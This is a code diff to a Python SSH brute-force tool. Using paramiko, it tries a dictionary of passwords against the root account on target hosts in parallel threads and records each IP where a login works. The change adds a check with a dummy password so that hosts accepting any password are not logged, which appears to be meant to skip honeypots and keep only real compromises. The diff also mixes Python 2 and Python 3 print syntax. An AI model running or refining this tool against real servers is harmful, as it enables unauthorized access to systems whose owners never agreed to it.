@@ -8,7 +8,6 @@ import os
 
 
 class SSHThread(threading.Thread):
-
     def __init__(self, ip, port, timeout, dic, LogFile):
         threading.Thread.__init__(self)
         self.ip = ip
@@ -20,6 +19,7 @@ class SSHThread(threading.Thread):
     def run(self):
         print("Start try ssh => %s" % self.ip)
         username = "root"
+        password = []
         try:
             password = open(self.dict).read().split('\n')
         except:
@@ -31,13 +31,15 @@ class SSHThread(threading.Thread):
                 ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                 ssh.connect(self.ip, self.port, username,
                             pwd, timeout=self.timeout)
-                print("\nIP => %s, Login %s => %s \n" %
-                      (self.ip, username, pwd))
-                # open(self.LogFile, "a").write("[ %s ] IP => %s, port => %d, %s => %s \n" % (
-                # time.asctime(time.localtime(time.time())), self.ip,
-                # self.port, username, pwd))
-                open(self.LogFile, "a").write(self.ip + '\n')
-                break
+                try:
+                    ssh.connect(self.ip, self.port, username, "*", timeout=self.timeout)
+                except:
+                    print "\nIP => %s, Login %s => %s \n" % (self.ip, username, pwd)
+                    # open(self.LogFile, "a").write("[ %s ] IP => %s, port => %d, %s => %s \n" % (
+                    # time.asctime(time.localtime(time.time())), self.ip,
+                    # self.port, username, pwd))
+                    open(self.LogFile, "a").write(self.ip + '\n')
+                    break
             except:
                 print("IP => %s, Error %s => %s" % (self.ip, username, pwd))
                 pass
